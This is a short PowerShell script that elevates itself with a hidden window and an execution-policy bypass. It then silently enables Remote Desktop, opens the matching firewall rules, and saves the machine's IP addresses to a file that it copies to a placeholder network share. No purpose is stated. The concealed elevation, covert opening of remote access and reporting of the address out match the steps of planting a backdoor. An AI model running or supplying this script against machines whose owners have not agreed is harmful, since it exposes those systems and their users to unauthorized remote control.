# Suppress all output by redirecting to Out-Null
If (-Not ([Security.Principal.WindowsPrincipal]([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process -FilePath PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# Enable Remote Desktop silently
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 | Out-Null

# Enable the firewall rule for Remote Desktop silently
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" | Out-Null

# Capture the IP address and save to file silently
$IPAddresses = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "169.*" }).IPAddress
$FilePath = "$env:USERPROFILE\Desktop\IPAddresses.txt"
$IPAddresses | Out-File -FilePath $FilePath

# Copy the file to a remote location silently
$RemotePath = "\\ServerName\SharedFolder\IPAddresses.txt"  # Replace with your network share
Copy-Item -Path $FilePath -Destination $RemotePath -Force | Out-Null
